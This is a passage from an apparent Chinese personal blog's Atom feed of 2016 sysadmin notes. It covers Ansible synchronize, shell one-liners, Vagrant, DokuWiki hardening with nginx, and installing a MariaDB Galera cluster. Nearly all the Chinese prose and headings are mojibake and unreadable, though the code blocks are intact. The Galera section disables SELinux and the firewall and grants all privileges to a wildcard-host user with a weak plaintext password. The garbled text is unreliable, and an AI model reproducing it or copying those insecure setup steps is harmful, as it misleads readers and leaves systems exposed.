<pre><code>synchronize: src=~/Documents/eg/svn/everinner_app_beta/config_app dest=/opt/www
</code></pre><p>è¿™ä¸ªç›¸å½“äºæŠŠ<code>config_app</code>ç›®å½•æ‹·è´åˆ°<code>/opt/www</code>ä¸‹, æ‹·è´åå˜æˆ<code>/opt/www/config_app</code>, å¦‚æœ å†™æˆ<code>dest=/opt/www/config_app</code>, æ‹·è´åä¼šå˜æˆ<code>/opt/www/config_app/config_app</code></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>æ³¨æ„å‡ ä¸ªå‚æ•°,[default: no]æˆ–è€…æœ‰ç‰¹æ®Šé…ç½®çš„:</p>
<ul>
<li>copy_links    æ‹·è´è½¯è¿æ¥çš„çœŸå®æ–‡ä»¶, è€Œä¸æ˜¯è½¯è¿æ¥</li>
<li>delete    åœ¨è¿›è¡ŒåŒæ­¥åæ˜¯å¦åˆ é™¤ src ä¸­ä¸å­˜åœ¨çš„æ–‡ä»¶, é»˜è®¤æƒ…å†µä¸‹, æ˜¯ä¼šä¿ç•™ dest ç›®æ ‡æ–‡ä»¶å¤¹åŸå…ˆå°±å­˜åœ¨çš„æ–‡ä»¶</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]æœ¬åœ°æˆ–è€…å§”æ‰˜åˆ°ç›®æ ‡æœº</li>
</ul>]]>
    
    </summary>
    
      <category term="Ansible" scheme="http://yoursite.com/tags/Ansible/"/>
    
      <category term="Synchronize" scheme="http://yoursite.com/tags/Synchronize/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ç³»ç»Ÿç®¡ç†å¸¸ç”¨è„šæœ¬]]></title>
    <link href="http://yoursite.com/2016/04/19/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2016/04/19/ç³»ç»Ÿç®¡ç†å¸¸ç”¨è„šæœ¬/</id>
    <published>2016-04-19T09:29:28.000Z</published>
    <updated>2016-05-11T07:02:55.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u6587_u4EF6_u548C_u6587_u4EF6_u5939_u6743_u9650_u9012_u5F52_u4E3A777_uFF0C_u8FD8_u539F_u6210_u9ED8_u8BA4_u7684755_u548C644"><a href="#u6587_u4EF6_u548C_u6587_u4EF6_u5939_u6743_u9650_u9012_u5F52_u4E3A777_uFF0C_u8FD8_u539F_u6210_u9ED8_u8BA4_u7684755_u548C644" class="headerlink" title="æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æƒé™é€’å½’ä¸º777ï¼Œè¿˜åŸæˆé»˜è®¤çš„755å’Œ644"></a>æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æƒé™é€’å½’ä¸º777ï¼Œè¿˜åŸæˆé»˜è®¤çš„755å’Œ644</h3><pre><code>find . -type f -exec chmod 644 {} +
find ./ -type d |xargs chmod 755
</code></pre><h3 id="u8BB2_ssh/config__u7684_u4E3B_u673A_u4FE1_u606F_u8F6C_u79FB_u5230_ansible_hosts__u6587_u4EF6"><a href="#u8BB2_ssh/config__u7684_u4E3B_u673A_u4FE1_u606F_u8F6C_u79FB_u5230_ansible_hosts__u6587_u4EF6" class="headerlink" title="è®² ssh/config çš„ä¸»æœºä¿¡æ¯è½¬ç§»åˆ° ansible hosts æ–‡ä»¶"></a>è®² ssh/config çš„ä¸»æœºä¿¡æ¯è½¬ç§»åˆ° ansible hosts æ–‡ä»¶</h3><pre><code>awk -F[=\ ] &apos;$2 ~ /HD_Server/ {print &quot;[&quot;$2&quot;]&quot;; a=a$2&quot;\n&quot;}; $1 ~ /Hostname/ {print $2} END{print &quot;[HDS]\n&quot;a}&apos; .ssh/config
</code></pre><p>å…¶ä¸­<code>a=a$2&quot;\n&quot;</code> ä¸ºå­—ç¬¦ä¸²è¿æ¥</p>
<h3 id="u521B_u5EFA_swap"><a href="#u521B_u5EFA_swap" class="headerlink" title="åˆ›å»º swap"></a>åˆ›å»º swap</h3><pre><code>[root@node1 ~]# cat create_swap.sh
#!/bin/bash

fallocate -l 512M /swapfile
chmod 600 /swapfile
mkswap /swapfile
swapon /swapfile
echo &quot;/swapfile none swap defaults 0 0&quot; &gt;&gt;  /etc/fstab
mount -a
free -m
</code></pre><h3 id="awk__u4EA4_u63621_2C2_u5217_2C__u4EE5tab__u4F5C_u4E3A_u5206_u9694_u7B26_u8F93_u51FA"><a href="#awk__u4EA4_u63621_2C2_u5217_2C__u4EE5tab__u4F5C_u4E3A_u5206_u9694_u7B26_u8F93_u51FA" class="headerlink" title="awk äº¤æ¢1,2åˆ—, ä»¥tab ä½œä¸ºåˆ†éš”ç¬¦è¾“å‡º"></a>awk äº¤æ¢1,2åˆ—, ä»¥tab ä½œä¸ºåˆ†éš”ç¬¦è¾“å‡º</h3><pre><code>awk  -v  OFS=&apos;\t&apos; &apos;{temp=$1;$1=$2;$2=temp;print}&apos; 1.txt
</code></pre><h3 id="u751F_u6210_key"><a href="#u751F_u6210_key" class="headerlink" title="ç”Ÿæˆ key"></a>ç”Ÿæˆ key</h3><pre><code>ssh-keygen -f test   -C &quot;test key&quot;
</code></pre><h3 id="u67E5_u770B_u547D_u4EE4_u5BF9_u5E94_u7684_rpm__u5B89_u88C5_u5305"><a href="#u67E5_u770B_u547D_u4EE4_u5BF9_u5E94_u7684_rpm__u5B89_u88C5_u5305" class="headerlink" title="æŸ¥çœ‹å‘½ä»¤å¯¹åº”çš„ rpm å®‰è£…åŒ…"></a>æŸ¥çœ‹å‘½ä»¤å¯¹åº”çš„ rpm å®‰è£…åŒ…</h3><p>æ¯”å¦‚æƒ³æŸ¥çœ‹ dig çš„:</p>
<pre><code>rpm -qf  `which dig`
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u6587_u4EF6_u548C_u6587_u4EF6_u5939_u6743_u9650_u9012_u5F52_u4E3A777_uFF0C_u8FD8_u539F_u6210_u9ED8_u8BA4_u7684755_u548C644"><a href=]]>
    </summary>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Vagrantå®‰è£…ä½¿ç”¨]]></title>
    <link href="http://yoursite.com/2016/04/14/Vagrant%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2016/04/14/Vagrantå®‰è£…ä½¿ç”¨/</id>
    <published>2016-04-14T10:49:01.000Z</published>
    <updated>2016-04-14T11:29:05.000Z</updated>
    <content type="html"><![CDATA[<p>ä¸‹è½½,å®‰è£…</p>
<p>åœ¨æ–° terminal å¯ä»¥çœ‹åˆ° vagrant å‘½ä»¤</p>
<pre><code>$ vagrant --version
Vagrant 1.8.1
</code></pre><h3 id="u51E0_u4E2A_u6982_u5FF5"><a href="#u51E0_u4E2A_u6982_u5FF5" class="headerlink" title="å‡ ä¸ªæ¦‚å¿µ"></a>å‡ ä¸ªæ¦‚å¿µ</h3><p><em>Provider</em>ï¼šä¾›åº”å•†ï¼Œåœ¨è¿™é‡ŒæŒ‡Vagrantè°ƒç”¨çš„è™šæ‹ŸåŒ–å·¥å…·ã€‚Vagrantæœ¬èº«å¹¶æ²¡æœ‰èƒ½åŠ›åˆ›å»ºè™šæ‹Ÿæœºï¼Œå®ƒæ˜¯è°ƒç”¨ä¸€äº›è™šæ‹ŸåŒ–å·¥å…·æ¥åˆ›å»ºï¼Œå¦‚VirtualBoxã€VMWareã€Xenã€Dockerï¼Œç”šè‡³AWSï¼Œè¿™äº›è™šæ‹ŸåŒ–å·¥å…·åªè¦å®‰è£…å¥½äº†ï¼Œvagrantä¼šè‡ªåŠ¨å°è£…åœ¨åº•å±‚é€šè¿‡ç»Ÿä¸€çš„å‘½ä»¤è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨vagrantæ—¶ä½ ç”µè„‘ä¸Šè¿˜éœ€è¦å®‰è£…å¯¹åº”çš„Providerï¼Œé»˜è®¤æ˜¯å…è´¹å¼€æºçš„virtualboxã€‚<br><em>Box</em>ï¼šå¯è¢«Vagrantç›´æ¥ä½¿ç”¨çš„è™šæ‹Ÿæœºé•œåƒæ–‡ä»¶ï¼Œå¤§å°æ ¹æ®å†…å®¹çš„ä¸åŒä»200M-2Gä¸ç­‰ã€‚é’ˆå¯¹ä¸åŒçš„Providerï¼ŒBoxæ–‡ä»¶çš„æ ¼å¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œä» vagrantcloud.com ä½ å¯ä»¥æ‰¾åˆ°ç¤¾åŒºç»´æŠ¤çš„boxã€‚</p>
<p><em>Vagrantfile</em>ï¼šVagrantæ ¹æ®Vagrantfileä¸­çš„é…ç½®æ¥åˆ›å»ºè™šæ‹Ÿæœºï¼Œæ˜¯Vagrantçš„æ ¸å¿ƒã€‚åœ¨Vagrantfileæ–‡ä»¶ä¸­ä½ éœ€è¦æŒ‡æ˜ä½¿ç”¨å“ªä¸ªBoxï¼ˆå¯ä»¥ä¸‹è½½å¥½çš„æˆ–è‡ªå·±åˆ¶ä½œï¼Œæˆ–æŒ‡å®šåœ¨çº¿çš„URLåœ°å€ï¼‰ï¼Œè™šæ‹Ÿæœºä½¿ç”¨çš„å†…å­˜å¤§å°å’ŒCPUï¼Œéœ€è¦é¢„å®‰è£…å“ªäº›è½¯ä»¶ï¼Œè™šæ‹Ÿæœºçš„ç½‘ç»œé…ç½®ï¼Œä¸hostçš„å…±äº«ç›®å½•ç­‰ã€‚</p>
<p><em>Provisioner</em>ï¼šæ˜¯Vagrantçš„æ’ä»¶çš„ä¸€ç§ã€‚å¤§éƒ¨åˆ†ç°æˆçš„boxå¹¶ä¸æ˜¯ä½ æ­£å¥½æƒ³è¦çš„ï¼Œé€šè¿‡ä½¿ç”¨ä½ ç†Ÿæ‚‰çš„provisionerï¼Œæ¯”å¦‚Puppetï¼Œå¯ä»¥åœ¨ä½ ä½¿ç”¨vagrant upå¯åŠ¨è™šæ‹Ÿæœºæ—¶è‡ªåŠ¨çš„å®‰è£…è½¯ä»¶ã€ä¿®æ”¹é…ç½®ç­‰åˆå§‹åŒ–æ“ä½œã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨æœ€å…ˆå¯åŠ¨è™šæ‹Ÿæœºåï¼Œä½¿ç”¨vagrant sshè¿›å»ç„¶åæ‰‹åŠ¨å®‰è£…è½¯ä»¶ï¼Œä½†æ¯•ç«Ÿä¸æ˜¯æ‰€æœ‰äººéƒ½æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ï¼Œå†™å¥½Vagrantfileåæ— éœ€äººå·¥å¹²é¢„é©¬ä¸Šå°±å¯ä»¥ä½¿ç”¨vmã€‚ç›®å‰æ”¯æŒå¹¶å®ç°çš„provisioningæœ‰Puppetã€Saltã€Ansibleã€Chefè¿™äº›çŸ¥åçš„è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·ï¼Œå½“ç„¶éœ€è¦ä¸€å®šçš„ä½¿ç”¨ç»éªŒï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨shell provisionerï¼Œæ•…åæ€è®®è¿™ä¸ªæ’ä»¶å°±æ˜¯é€šè¿‡æ‰§è¡Œshellå‘½ä»¤å®Œæˆç»Ÿä¸€çš„ä½œç”¨ã€‚</p>
<p><em>Guest Additions</em>ï¼šè¿™ä¸ªæ˜¯å¸¸åœ¨ä¸‹è½½ base box ä»‹ç»é‡Œæœ‰çš„ï¼Œä¸€èˆ¬ç”¨æ¥å®ç°hoståˆ°vmçš„ç«¯å£è½¬å‘ã€ç›®å½•å…±äº«ï¼Œåœ¨å¼€å‘ç¯å¢ƒä¸Šéƒ½å»ºè®®è£…ä¸Šä»¥ä¾¿æµ‹è¯•ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>ä¸‹è½½,å®‰è£…</p>
<p>åœ¨æ–° terminal å¯ä»¥çœ‹åˆ° vagrant å‘½ä»¤</p>
<pre><code>$ vagrant --version
Vagrant 1.8.1
</code></pre><h3 id="u51E0_u4E2A_u6982_u5FF5"><]]>
    </summary>
    
      <category term="vagrant" scheme="http://yoursite.com/tags/vagrant/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[å®‰è£…ç®¡ç†Dokuwiki]]></title>
    <link href="http://yoursite.com/2016/04/14/%E5%AE%89%E8%A3%85%E7%AE%A1%E7%90%86Dokuwiki/"/>
    <id>http://yoursite.com/2016/04/14/å®‰è£…ç®¡ç†Dokuwiki/</id>
    <published>2016-04-14T04:00:33.000Z</published>
    <updated>2016-04-15T01:39:10.000Z</updated>
    <content type="html"><![CDATA[<p>æ­å»º lnmp ç¯å¢ƒ</p>
<p>ä¸‹è½½è§£å‹, å°†è§£å‹æ–‡ä»¶é…ç½®ä¸ºnginxè™šæ‹Ÿä¸»æœºæ ¹ç›®å½•</p>
<p>ä¸»è¦è®²ä¸‹å®‰å…¨è®¾ç½®</p>
<p>ä¸»è¦æ˜¯ç¦æ­¢ç›´æ¥è®¿é—®</p>
<ul>
<li>data</li>
<li>conf</li>
<li>bin</li>
</ul>
<p>è¿™ä¸‰ä¸ªç›®å½•</p>
<p>æ£€æµ‹æ–¹å¼æ˜¯çœ‹èƒ½å¦è®¿é—®åˆ°</p>
<p><a href="http://yoursite.com/data/pages/wiki/dokuwiki.txt">http://yoursite.com/data/pages/wiki/dokuwiki.txt</a></p>
<a id="more"></a>
<h3 id="u914D_u7F6Enginx_u7981_u6B62_u8BBF_u95EE_u7279_u5B9A_u76EE_u5F55"><a href="#u914D_u7F6Enginx_u7981_u6B62_u8BBF_u95EE_u7279_u5B9A_u76EE_u5F55" class="headerlink" title="é…ç½®nginxç¦æ­¢è®¿é—®ç‰¹å®šç›®å½•"></a>é…ç½®nginxç¦æ­¢è®¿é—®ç‰¹å®šç›®å½•</h3><p>ä¸€å¼€å§‹æ‰“ç®—ç”¨ nginx ç¦æ­¢ç›®å½•è®¿é—®åŠŸèƒ½, åœ¨ nginx é…ç½®äº†:</p>
<pre><code>location ^~ /(data|conf|bin|inc)/* {
        deny all;
}
</code></pre><h3 id="u6539_u53D8_u6570_u636E_u76EE_u5F55_u4F4D_u7F6E"><a href="#u6539_u53D8_u6570_u636E_u76EE_u5F55_u4F4D_u7F6E" class="headerlink" title="æ”¹å˜æ•°æ®ç›®å½•ä½ç½®"></a>æ”¹å˜æ•°æ®ç›®å½•ä½ç½®</h3><p>å½“ç„¶æœ€å¥½æ˜¯ç›´æ¥æŠŠè¿™äº›ç›®å½•è¿å‡ºç½‘ç«™æ ¹ç›®å½•äº†</p>
<pre><code># è½¬ç§»conf
[root@HD_Server_Config dokuwiki-2015-08-10a]# mv conf /data/dokuwiki/
# æ·»åŠ é…ç½®
[root@HD_Server_Config dokuwiki-2015-08-10a]# vim inc/preload.php
&lt;?php

define(&apos;DOKU_CONF&apos;,&apos;/data/dokuwiki/conf/&apos;);

# è½¬ç§» data
[root@HD_Server_Config dokuwiki-2015-08-10a]# mv data /data/dokuwiki/
# æ·»åŠ é…ç½®
[root@HD_Server_Config dokuwiki-2015-08-10a]# vim /data/dokuwiki/conf/local.php

$conf[&apos;savedir&apos;] = &apos;/data/dokuwiki/data/&apos;;

# è½¬ç§» bin
[root@HD_Server_Config dokuwiki-2015-08-10a]# mv bin /data/dokuwiki/
</code></pre><h3 id="u5B89_u88C5_u63D2_u4EF6"><a href="#u5B89_u88C5_u63D2_u4EF6" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h3><p><strong>ç®¡ç†</strong> -&gt; <strong>æ‰©å±•ç®¡ç†å™¨</strong></p>
<p><strong>æœç´¢å’Œå®‰è£…</strong>  </p>
<p><em>swiftmail</em> é…ç½®å‘é€ smtp é‚®ä»¶, ç„¶ååœ¨ <strong>ç®¡ç†</strong> -&gt; <strong>é…ç½®è®¾ç½®</strong> -&gt; <strong>æ’ä»¶è®¾ç½®</strong>(å³ä¾§è¾¹æ å¤„)</p>
<p>smtp_host : smtp.exmail.qq.com</p>
<p>smtp_port: 465</p>
<p>smtp_ssl: SSL</p>
<p>auth_user: smtp é‚®ç®±åœ°å€, æ¯”å¦‚admin@123.com</p>
<p>auth_pass: é‚®ç®±å¯†ç </p>
<p>localdomain: yoursite.com</p>
<p>é™¤æ­¤ä¹‹å¤–, è¿˜éœ€è¦é…ç½®<strong>é€šçŸ¥è®¾ç½®</strong></p>
<p>é€šçŸ¥è®¾ç½®é‡Œçš„ä¸œè¥¿å…¨éƒ¨å¡«ä¸Šå‹¾ä¸Š</p>
<p>æ¯”å¦‚é‚®ä»¶åœ°å€éƒ½å¡«</p>
<p>admin@123.com</p>
<p>é‚®ä»¶å‰ç¼€å¡«wiki_admin</p>
<p>è®¾ç½®å®Œä¹‹å <strong>ç®¡ç†</strong> ç•Œé¢ä¸‹æœ‰ä¸ª <strong>æ£€æŸ¥ SwiftMail é…ç½®</strong></p>
<p><em>imgpaste</em> åœ¨ç¼–è¾‘å™¨ç›´æ¥ç²˜è´´å°±å¯ä»¥æ’å…¥å‰ªè´´æ¿ä¸­çš„å›¾ç‰‡ï¼Œå¯ä»¥ç”¨æ¥å¿«é€Ÿä¸Šä¼ æˆªå›¾ã€‚</p>
<p><em>Tag</em>    åœ¨æ–‡æ¡£é¡¶éƒ¨åŠ å…¥æ ‡ç­¾ </p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="expansion">&#123;&#123;tag&gt;it mannual&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p><em>cloud</em>  æ”¯æŒæ ‡ç­¾äº‘</p>
<p><em>Backup Tool</em> å¤‡ä»½å·¥å…·</p>
<p><em>addnewpage</em>  æ–°å»ºé¡µé¢åŠŸèƒ½å¤ªéšæ™¦äº†â€¦ å¾—åœ¨ url é‚£é‡Œæ·»åŠ , æ‰€ä»¥æäº†ä¸ªæ’ä»¶</p>
<p><em>pagelist</em>    è¡¨æ ¼å½¢å¼åˆ—å‡ºwikié¡µé¢åˆ—è¡¨</p>
<h3 id="u7F16_u8F91"><a href="#u7F16_u8F91" class="headerlink" title="ç¼–è¾‘"></a>ç¼–è¾‘</h3><p><a href="https://www.dokuwiki.org/start?id=zh:wiki:syntax" target="_blank" rel="external">æ ¼å¼åŒ–è¯­æ³•</a></p>
<h3 id="u5347_u7EA7"><a href="#u5347_u7EA7" class="headerlink" title="å‡çº§"></a>å‡çº§</h3><p><a href="https://www.dokuwiki.org/zh:install:upgrade" target="_blank" rel="external">å‡çº§</a></p>
<h3 id="u6279_u91CF_u7528_u6237_u5BFC_u5165"><a href="#u6279_u91CF_u7528_u6237_u5BFC_u5165" class="headerlink" title="æ‰¹é‡ç”¨æˆ·å¯¼å…¥"></a>æ‰¹é‡ç”¨æˆ·å¯¼å…¥</h3><p>å…ˆæ˜¯åˆ›å»ºäº†2ä¸ªç”¨æˆ·, ç„¶åå¯¼å‡ºäº†ç”¨æˆ· csv æ–‡ä»¶, çœ‹äº†ä¸€ä¸‹æ–‡ä»¶ç»“æ„:</p>
<pre><code>user1,user1,user1@yoursite.cn,user
user2,user2,user2@yoursite.cn,user
</code></pre><p>ç„¶åå»ºç«‹ä¸€ä¸ªæ–‡ä»¶,é‡Œé¢å­˜æ”¾ç”¨æˆ·å:</p>
<pre><code>user3
user4
...
</code></pre><p>æœ€åç”¨ awk ç”Ÿæˆ csv æ–‡ä»¶</p>
<pre><code>awk &apos;{printf &quot;%s,%s,%s@yoursite.cn,user\n&quot;, $1,$1,$1}&apos; member.txt &gt; member.csv
</code></pre><p>å¯¼å…¥ csv æ–‡ä»¶å³å¯</p>
<p>å‚è€ƒ:</p>
<p><a href="https://www.dokuwiki.org/zh:security" target="_blank" rel="external">Dokuwikiuå®‰å…¨</a></p>
<p><a href="http://drops.wooyun.org/tips/1323" target="_blank" rel="external">Nginxå®‰å…¨é…ç½®ç ”ç©¶</a></p>
<p><a href="http://www.jianshu.com/p/a6b00b055fcd" target="_blank" rel="external">DokuWikiç®€ä»‹åŠæ’ä»¶æ¨è</a></p>
<p><a href="http://www.ligenyuan.cn/wiki/reproduce:dokuwiki_page_name" target="_blank" rel="external">dokuwikiå‘½åç©ºé—´</a></p>
<p><a href="http://www.baiguo.net/wiki/doku.php?id=wiki:plugins" target="_blank" rel="external">Dokuæ’ä»¶æ•´ç†</a></p>
<p><a href="http://blog.csdn.net/zouhao619/article/details/8523637" target="_blank" rel="external">æ›´æ¢ç¼–è¾‘å™¨â€“æˆ‘è¿˜æ²¡ç©ºæŠ˜è…¾è¿™ä¸ªâ€¦</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>æ­å»º lnmp ç¯å¢ƒ</p>
<p>ä¸‹è½½è§£å‹, å°†è§£å‹æ–‡ä»¶é…ç½®ä¸ºnginxè™šæ‹Ÿä¸»æœºæ ¹ç›®å½•</p>
<p>ä¸»è¦è®²ä¸‹å®‰å…¨è®¾ç½®</p>
<p>ä¸»è¦æ˜¯ç¦æ­¢ç›´æ¥è®¿é—®</p>
<ul>
<li>data</li>
<li>conf</li>
<li>bin</li>
</ul>
<p>è¿™ä¸‰ä¸ªç›®å½•</p>
<p>æ£€æµ‹æ–¹å¼æ˜¯çœ‹èƒ½å¦è®¿é—®åˆ°</p>
<p><a href="http://yoursite.com/data/pages/wiki/dokuwiki.txt">http://yoursite.com/data/pages/wiki/dokuwiki.txt</a></p>]]>
    
    </summary>
    
      <category term="Dokuwiki" scheme="http://yoursite.com/tags/Dokuwiki/"/>
    
      <category term="nginx" scheme="http://yoursite.com/tags/nginx/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[MySQL Galera Cluster å­¦ä¹ ]]></title>
    <link href="http://yoursite.com/2016/04/13/MySQL-Galera-Cluster-%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2016/04/13/MySQL-Galera-Cluster-å­¦ä¹ /</id>
    <published>2016-04-13T09:07:44.000Z</published>
    <updated>2016-04-20T00:34:45.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://galeracluster.com/documentation-webpages/" target="_blank" rel="external">å®˜ç½‘æ–‡æ¡£</a></p>
<h2 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><h3 id="u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5"><a href="#u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5" class="headerlink" title="æœ‰ä¸‰ç§ç‰ˆæœ¬å¯ä»¥é€‰æ‹©å®‰è£…"></a>æœ‰ä¸‰ç§ç‰ˆæœ¬å¯ä»¥é€‰æ‹©å®‰è£…</h3><ul>
<li>mysql ç‰ˆæœ¬</li>
<li>Percona XtraDB Cluster ç‰ˆæœ¬</li>
<li>Mariadb ç‰ˆæœ¬</li>
</ul>
<h3 id="u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A"><a href="#u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A" class="headerlink" title="å®‰è£…é‡åˆ°å¾ˆå¤šå‘:"></a>å®‰è£…é‡åˆ°å¾ˆå¤šå‘:</h3><p>æ¯”å¦‚, å®‰è£… mysql ç‰ˆæœ¬çš„, æ›´æ–° yum æºæ—¶å€™, è¢«å¢™äº†:</p>
<pre><code>http://releases.galeracluster.com/centos/6/x86_64/repodata/repomd.xml: [Errno 14] PYCURL ERROR 6 - &quot;Couldn&apos;t resolve host &apos;releases.galeracluster.com&apos;&quot;
Trying other mirror.
Error: Cannot retrieve repository metadata (repomd.xml) for repository: galera. Please verify its path and try again
</code></pre><p>æ¯”å¦‚, å®‰è£… Percona XtraDB Cluster ç‰ˆæœ¬çš„, æç¤ºä»“åº“æ²¡é‚£ä¸ªè½¯ä»¶åŒ…â€¦</p>
<pre><code>[root@node2 ~]#  yum install Percona-XtraDB-Cluster -y
Loaded plugins: security
Setting up Install Process
No package Percona-XtraDB-Cluster available.
Error: Nothing to do
</code></pre><p>æ¯”å¦‚, è£…äº† PXC çš„ yum ä»“åº“åŒ…ä¹‹å, å†è£… mariadb, ä¼šäº§ç”Ÿè½¯ä»¶åŒ…å†²çª, md å¾—æ ¼å¼åŒ–ç³»ç»Ÿäº† - -</p>
<pre><code>Transaction Check Error:
  file /usr/lib64/libmysqlclient.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /usr/lib64/libmysqlclient_r.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /etc/my.cnf from install of MariaDB-common-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
</code></pre><a id="more"></a>
<h3 id="u5B89_u88C5Mariadb__u7248_u672C_3A"><a href="#u5B89_u88C5Mariadb__u7248_u672C_3A" class="headerlink" title="å®‰è£…Mariadb ç‰ˆæœ¬:"></a>å®‰è£…Mariadb ç‰ˆæœ¬:</h3><h4 id="u660E_u767D_u5B89_u88C5_u7684_u662F_u4EC0_u4E48"><a href="#u660E_u767D_u5B89_u88C5_u7684_u662F_u4EC0_u4E48" class="headerlink" title="æ˜ç™½å®‰è£…çš„æ˜¯ä»€ä¹ˆ"></a>æ˜ç™½å®‰è£…çš„æ˜¯ä»€ä¹ˆ</h4><p>å®‰è£…çš„æ˜¯æ•°æ®åº“å‘½ä»¤è¡Œå®¢æˆ·ç«¯, æ‰“äº† wsrep API è¡¥ä¸çš„æ•°æ®åº“æœåŠ¡å™¨, è¿˜æœ‰ Galera é›†ç¾¤æ’ä»¶</p>
<blockquote>
<p>There are three packages involved in the installation of MariaDB Galera Cluster: the MariaDB database client, a command line tool for accessing the database; the MariaDB database server, built to include the wsrep API patch; and the Galera Replication Plugin.</p>
</blockquote>
<p>è·Ÿæ™®é€šçš„æ•°æ®åº“åŒ…æœ‰ä»€ä¹ˆä¸åŒ?<br>&gt;<br>Binary installation packages for Galera Cluster include the database server with the wsrep API patch. When building from source, you must apply this patch yourself.</p>
<p>äº†è§£ä¸Šé¢ä¹‹å, å¼€å§‹å®‰è£…. æˆ‘ç”¨çš„ centos6.5 ,å…ˆæŠŠ selinux, é˜²ç«å¢™å•¥çš„éƒ½å…³äº†</p>
<pre><code>[root@node1,2,3 ~]# cat /etc/yum.repos.d/MariaDB.repo
[mariadb]
name = MariaDB
baseurl = http://yum.mariadb.org/10.0/centos6-amd64
gpgkey = https://yum.mariadb.org/RPM-GPG-KEY-MariaDB
gpgcheck = 1
</code></pre><p>è§é¬¼, é˜¿é‡Œäº‘çš„ dns è§£æå±…ç„¶è§£æä¸åˆ° yum.mariadb.org , å°† dns ä¿®æ”¹ä¸º114çš„æ‰è¡Œ</p>
<pre><code>[root@node1,2,3 ~]# yum clean all
[root@node1,2,3 ~]# yum makecache
[root@node1,2,3 ~]# yum install MariaDB-client MariaDB-Galera-server galera -y
</code></pre><p>æŠ˜è…¾äº†ä¸€ç•ª, ç»ˆäºè£…ä¸Šäº†</p>
<pre><code>[root@node1,2,3 ~]# mysql --version
mysql  Ver 15.1 Distrib 10.0.24-MariaDB, for Linux (x86_64) using readline 5.1
</code></pre><p><a href="http://galeracluster.com/documentation-webpages/installmariadb.html" target="_blank" rel="external">å®‰è£…å‚è€ƒ</a></p>
<h2 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p><del>åˆ›å»ºæ•°æ®åº“ç›®å½•</del></p>
<p><del>mkdir -p /data/MariaDB/data</del></p>
<p><del>chown -R mysql:mysql /data/MariaDB/</del></p>
<h3 id="u521D_u59CB_u5316_u914D_u7F6E"><a href="#u521D_u59CB_u5316_u914D_u7F6E" class="headerlink" title="åˆå§‹åŒ–é…ç½®"></a>åˆå§‹åŒ–é…ç½®</h3><pre><code>[root@node1,2,3 ~]# service mysql start
[root@node1,2,3 ~]# mysql_secure_installation   #ç”Ÿæˆ root å¯†ç , åˆ«çš„å…¨é€‰ y
[root@node1,2,3 ~]# chkconfig mysql on
</code></pre><h3 id="u521B_u5EFA"><a href="#u521B_u5EFA" class="headerlink" title="åˆ›å»º"></a>åˆ›å»º</h3><pre><code>é›†ç¾¤åŒæ­¥ç”¨æˆ·
mysql -uroot -p
GRANT ALL PRIVILEGES ON *.* TO &apos;cluster&apos;@&apos;%&apos; IDENTIFIED BY &apos;lookback&apos; WITH GRANT OPTION;
FLUSH PRIVILEGES;
</code></pre><h3 id="u4FEE_u6539_u914D_u7F6E_u6587_u4EF6"><a href="#u4FEE_u6539_u914D_u7F6E_u6587_u4EF6" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>node1</p>
<pre><code>[root@node1 ~]# sed -ne &apos;/\[mariadb-10.0\]/,$p&apos; /etc/my.cnf.d/server.cnf
[mariadb-10.0]

query_cache_size=0
binlog_format=ROW
default_storage_engine=innodb
innodb_autoinc_lock_mode=2
wsrep_provider=/usr/lib64/galera/libgalera_smm.so
